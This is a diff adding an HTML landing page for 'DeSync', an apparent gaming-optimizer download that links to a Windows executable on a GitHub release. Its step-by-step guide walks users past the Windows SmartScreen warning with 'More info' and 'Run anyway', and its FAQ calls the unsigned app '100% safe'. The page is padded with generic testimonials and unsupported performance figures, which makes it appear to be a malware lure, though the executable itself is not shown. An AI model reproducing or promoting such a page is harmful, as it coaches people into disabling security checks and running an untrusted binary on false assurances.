@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DeSync - Optimize Your Gaming Experience</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Orbitron:wght@500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #2962ff;
+            --primary-dark: #0039cb;
+            --secondary: #00b8d4;
+            --dark: #121212;
+            --light: #f5f5f7;
+            --gray: #2c2c2e;
+            --success: #00c853;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: var(--light);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        
+        /* Header & Navigation */
+        header {
+            background-color: rgba(18, 18, 18, 0.8);
+            backdrop-filter: blur(10px);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--light);
+            font-family: 'Orbitron', sans-serif;
+            text-decoration: none;
+        }
+        
+        .logo i {
+            color: var(--secondary);
+            animation: pulse 2s infinite;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .nav-links a {
+            color: var(--light);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1.1rem;
+            transition: color 0.3s;
+            position: relative;
+        }
+        
+        .nav-links a:hover {
+            color: var(--secondary);
+        }
+        
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            bottom: -5px;
+            left: 0;
+            background-color: var(--secondary);
+            transition: width 0.3s;
+        }
+        
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+        
+        /* Hero Section */
+        .hero {
+            padding: 180px 0 100px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, rgba(41, 98, 255, 0.1) 0%, rgba(0, 0, 0, 0) 70%);
+            pointer-events: none;
+        }
+        
+        .hero h1 {
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            font-family: 'Orbitron', sans-serif;
+            text-transform: uppercase;
+            background: linear-gradient(to right, #4facfe, #00f2fe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero p {
+            font-size: 1.5rem;
+            max-width: 800px;
+            margin: 0 auto 40px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 50px;
+            margin: 40px 0;
+            flex-wrap: wrap;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--secondary);
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        .stat-label {
+            font-size: 1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            opacity: 0.7;
+        }
+        
+        /* Download Button */
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--primary);
+            color: white;
+            font-size: 1.5rem;
+            font-weight: 600;
+            padding: 18px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 25px rgba(41, 98, 255, 0.4);
+            margin: 30px 0;
+            border: none;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .download-btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(41, 98, 255, 0.6);
+        }
+        
+        .download-btn:active {
+            transform: translateY(0);
+        }
+        
+        .download-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: rgba(255, 255, 255, 0.1);
+            transform: rotate(30deg);
+            transition: all 0.8s;
+        }
+        
+        .download-btn:hover::after {
+            transform: rotate(30deg) translate(20%, 20%);
+        }
+        
+        .download-note {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
+            max-width: 500px;
+            margin: 10px auto;
+        }
+        
+        /* Features Section */
+        .section {
+            padding: 100px 0;
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 60px;
+            font-family: 'Orbitron', sans-serif;
+            color: white;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        
+        .feature-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            transition: transform 0.3s, background 0.3s;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-10px);
+            background: rgba(41, 98, 255, 0.1);
+        }
+        
+        .feature-icon {
+            font-size: 3rem;
+            color: var(--secondary);
+            margin-bottom: 20px;
+        }
+        
+        .feature-title {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: white;
+        }
+        
+        /* Installation Guide */
+        .guide-steps {
+            display: flex;
+            flex-direction: column;
+            gap: 50px;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        
+        .step {
+            display: flex;
+            gap: 30px;
+            align-items: center;
+        }
+        
+        .step:nth-child(even) {
+            flex-direction: row-reverse;
+        }
+        
+        .step-content {
+            flex: 1;
+        }
+        
+        .step-number {
+            font-size: 4rem;
+            font-weight: 700;
+            color: var(--secondary);
+            opacity: 0.3;
+            font-family: 'Orbitron', sans-serif;
+            min-width: 80px;
+        }
+        
+        .step-title {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: white;
+        }
+        
+        .step-image {
+            flex: 1;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s;
+        }
+        
+        .step-image:hover {
+            transform: scale(1.03);
+        }
+        
+        .step-image img {
+            width: 100%;
+            display: block;
+        }
+        
+        .highlight {
+            background: rgba(0, 184, 212, 0.1);
+            padding: 3px 8px;
+            border-radius: 5px;
+            color: var(--secondary);
+        }
+        
+        /* Testimonials */
+        .testimonials {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        
+        .testimonial {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            border-radius: 15px;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .testimonial::before {
+            content: '"';
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 5rem;
+            color: var(--secondary);
+            opacity: 0.2;
+            font-family: serif;
+        }
+        
+        .testimonial-content {
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .author-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: var(--gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+        }
+        
+        .author-info h4 {
+            color: white;
+            margin-bottom: 5px;
+        }
+        
+        .author-info p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.9rem;
+        }
+        
+        /* Footer */
+        footer {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 60px 0 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+        
+        .footer-column h3 {
+            color: white;
+            margin-bottom: 20px;
+            font-size: 1.3rem;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-links a:hover {
+            color: var(--secondary);
+        }
+        
+        .social-links {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .social-links a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            transition: all 0.3s;
+        }
+        
+        .social-links a:hover {
+            background: var(--primary);
+            transform: translateY(-5px);
+        }
+        
+        .copyright {
+            text-align: center;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.9rem;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .hero p {
+                font-size: 1.2rem;
+            }
+            
+            .step, .step:nth-child(even) {
+                flex-direction: column;
+            }
+            
+            .step-image {
+                width: 100%;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+        }
+        
+        /* Animations */
+        @keyframes pulse {
+            0% {
+                text-shadow: 0 0 5px rgba(0, 184, 212, 0.5);
+            }
+            50% {
+                text-shadow: 0 0 20px rgba(0, 184, 212, 0.8);
+            }
+            100% {
+                text-shadow: 0 0 5px rgba(0, 184, 212, 0.5);
+            }
+        }
+        
+        .fade-in {
+            animation: fadeIn 1s ease-in;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <nav class="navbar">
+                <a href="#" class="logo">
+                    <i class="fas fa-sync-alt"></i>
+                    <span>DeSync</span>
+                </a>
+                <div class="nav-links">
+                    <a href="#features">Features</a>
+                    <a href="#how-it-works">How It Works</a>
+                    <a href="#testimonials">Testimonials</a>
+                    <a href="#faq">FAQ</a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <h1>Eliminate Lag, Maximize Performance</h1>
+            <p>DeSync optimizes your system in real-time to reduce frame drops, network latency, and input delay for the ultimate gaming experience.</p>
+            
+            <a href="https://github.com/DeSyncOfficial/DeSync-exe-Download/releases/download/v1.0/DeSync.exe" 
+   class="download-btn fade-in">
+   <i class="fas fa-download"></i> Download DeSync Now (70MB)
+</a>
+            
+            <p class="download-note">Compatible with Windows 10/11. File size: 70 MB</p>
+            
+            <div class="hero-stats">
+                <div class="stat-item">
+                    <div class="stat-value">83%</div>
+                    <div class="stat-label">Reduced Lag</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">63%</div>
+                    <div class="stat-label">FPS Increase</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value"><35ms</div>
+                    <div class="stat-label">Avg. Latency</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="section" id="features">
+        <div class="container">
+            <h2 class="section-title">Powerful Performance Optimization</h2>
+            <div class="features-grid">
+                <div class="feature-card fade-in">
+                    <div class="feature-icon">
+                        <i class="fas fa-tachometer-alt"></i>
+                    </div>
+                    <h3 class="feature-title">Real-Time Optimization</h3>
+                    <p>DeSync continuously monitors your system to allocate resources where they're needed most during gameplay.</p>
+                </div>
+                <div class="feature-card fade-in">
+                    <div class="feature-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h3 class="feature-title">FPS Boost</h3>
+                    <p>Increase your frame rates by optimizing background processes and GPU resource allocation.</p>
+                </div>
+                <div class="feature-card fade-in">
+                    <div class="feature-icon">
+                        <i class="fas fa-network-wired"></i>
+                    </div>
+                    <h3 class="feature-title">Network Optimization</h3>
+                    <p>Reduce ping and packet loss with our intelligent network traffic prioritization system.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Installation Guide -->
+    <section class="section" id="how-it-works" style="background: rgba(0,0,0,0.3);">
+        <div class="container">
+            <h2 class="section-title">Simple Installation Guide</h2>
+            <div class="guide-steps">
+                <!-- Step 1 -->
+                <div class="step fade-in">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <h3 class="step-title">Download DeSync</h3>
+                        <p>Click the <span class="highlight">Download DeSync Now</span> button above to get the installer. Save the file to your computer.</p>
+                    </div>
+                    <div class="step-image">
+                        <img src="https://raw.githubusercontent.com/DeSyncOfficial/DeSync-exe-Download/refs/heads/main/app_Icon.png" alt="DeSync application icon">
+                    </div>
+                </div>
+                
+                <!-- Step 2 -->
+                <div class="step fade-in">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <h3 class="step-title">Windows Security Notice</h3>
+                        <p>When you run the installer, Windows may show a security warning. This is normal for new applications.</p>
+                        <p>Click on <span class="highlight">More info</span> to proceed with installation.</p>
+                    </div>
+                    <div class="step-image">
+                        <img src="https://github.com/DeSyncOfficial/DeSync-exe-Download/blob/main/more_Info.png?raw=true" alt="Windows security warning with More info button circled">
+                    </div>
+                </div>
+                
+                <!-- Step 3 -->
+                <div class="step fade-in">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <h3 class="step-title">Run Anyway</h3>
+                        <p>After clicking "More info", you'll see the <span class="highlight">Run anyway</span> button. Click this to proceed with installation.</p>
+                        <p>This step confirms you trust the application and want to install it.</p>
+                    </div>
+                    <div class="step-image">
+                        <img src="https://github.com/DeSyncOfficial/DeSync-exe-Download/blob/main/run_Anyway.png?raw=true" alt="Windows security expanded with Run anyway button circled">
+                    </div>
+                </div>
+                
+                <!-- Step 4 -->
+                <div class="step fade-in">
+                    <div class="step-number">4</div>
+                    <div class="step-content">
+                        <h3 class="step-title">Enjoy Optimized Gaming</h3>
+                        <p>Once installed, DeSync will run in the background. You'll immediately notice smoother gameplay and reduced latency.</p>
+                        <p>The app icon will appear in your system tray for quick access to settings.</p>
+                    </div>
+                    <div class="step-image">
+                        <img src="app_Icon.png" alt="DeSync application running">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="section" id="testimonials">
+        <div class="container">
+            <h2 class="section-title">What Gamers Say</h2>
+            <div class="testimonials">
+                <div class="testimonial fade-in">
+                    <div class="testimonial-content">
+                        <p>"DeSync completely transformed my gaming experience. My FPS in competitive games increased by 40% and the micro-stutters are gone!"</p>
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="author-info">
+                            <h4>Alex Johnson</h4>
+                            <p>Professional Esports Player</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="testimonial fade-in">
+                    <div class="testimonial-content">
+                        <p>"I was skeptical at first, but after trying DeSync I can't game without it. The network optimization alone is worth it for online play."</p>
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="author-info">
+                            <h4>Maria Rodriguez</h4>
+                            <p>Twitch Streamer</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="testimonial fade-in">
+                    <div class="testimonial-content">
+                        <p>"Finally, a performance tool that actually works! My older gaming laptop runs new titles smoothly thanks to DeSync's optimizations."</p>
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="author-info">
+                            <h4>James Wilson</h4>
+                            <p>Casual Gamer</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="section" id="faq" style="background: rgba(0,0,0,0.3);">
+        <div class="container">
+            <h2 class="section-title">Frequently Asked Questions</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <h3 class="feature-title"><i class="fas fa-question-circle"></i> Is DeSync safe to use?</h3>
+                    <p>Absolutely! DeSync is 100% safe. The Windows security warning appears because we're a new application without an established reputation yet. We never collect personal data.</p>
+                </div>
+                <div class="feature-card">
+                    <h3 class="feature-title"><i class="fas fa-microchip"></i> Will it work on my system?</h3>
+                    <p>DeSync works on Windows 10 and 11 with at least 4GB RAM. It's optimized for both gaming laptops and desktops. We support all major GPUs from NVIDIA, AMD, and Intel.</p>
+                </div>
+                <div class="feature-card">
+                    <h3 class="feature-title"><i class="fas fa-gamepad"></i> Does it work with all games?</h3>
+                    <p>Yes! DeSync is game-agnostic and works with any title - from competitive shooters to open-world RPGs. It automatically detects when you launch a game.</p>
+                </div>
+                <div class="feature-card">
+                    <h3 class="feature-title"><i class="fas fa-plug"></i> Does it affect internet speed?</h3>
+                    <p>DeSync optimizes network traffic for gaming but doesn't limit your overall bandwidth. You'll notice reduced ping and packet loss without sacrificing download speeds.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Final CTA -->
+    <section class="section">
+        <div class="container" style="text-align: center;">
+            <h2 class="section-title">Ready to Transform Your Gaming?</h2>
+            <p style="font-size: 1.3rem; max-width: 700px; margin: 0 auto 30px;">Join thousands of gamers who eliminated lag and boosted performance with DeSync</p>
+            <a href="DeSync.exe" download class="download-btn">
+                <i class="fas fa-download"></i> Download DeSync Now
+            </a>
+            <p class="download-note">Free version - No registration required</p>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h3>DeSync</h3>
+                    <p>Optimizing your gaming experience since 2023. Eliminate lag, boost FPS, and dominate the competition.</p>
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-discord"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-youtube"></i></a>
+                        <a href="#"><i class="fab fa-twitch"></i></a>
+                    </div>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>Quick Links</h3>
+                    <div class="footer-links">
+                        <a href="#features">Features</a>
+                        <a href="#how-it-works">Installation Guide</a>
+                        <a href="#testimonials">Testimonials</a>
+                        <a href="#faq">FAQ</a>
+                    </div>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>Support</h3>
+                    <div class="footer-links">
+                        <a href="#">Contact Us</a>
+                        <a href="#">Documentation</a>
+                        <a href="#">Troubleshooting</a>
+                        <a href="#">Uninstall Guide</a>
+                    </div>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>Legal</h3>
+                    <div class="footer-links">
+                        <a href="#">Terms of Service</a>
+                        <a href="#">Privacy Policy</a>
+                        <a href="#">Refund Policy</a>
+                        <a href="#">Cookie Policy</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                &copy; 2023 DeSync Technologies. All rights reserved. Windows is a registered trademark of Microsoft Corporation.
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Simple fade-in animation for elements when they enter viewport
+        const fadeElements = document.querySelectorAll('.fade-in');
+        
+        const fadeInObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = 1;
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, { threshold: 0.1 });
+        
+        fadeElements.forEach(element => {
+            element.style.opacity = 0;
+            element.style.transform = 'translateY(20px)';
+            element.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+            fadeInObserver.observe(element);
+        });
+        
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                const targetId = this.getAttribute('href');
+                if(targetId === '#') return;
+                
+                const targetElement = document.querySelector(targetId);
+                if(targetElement) {
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 80,
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
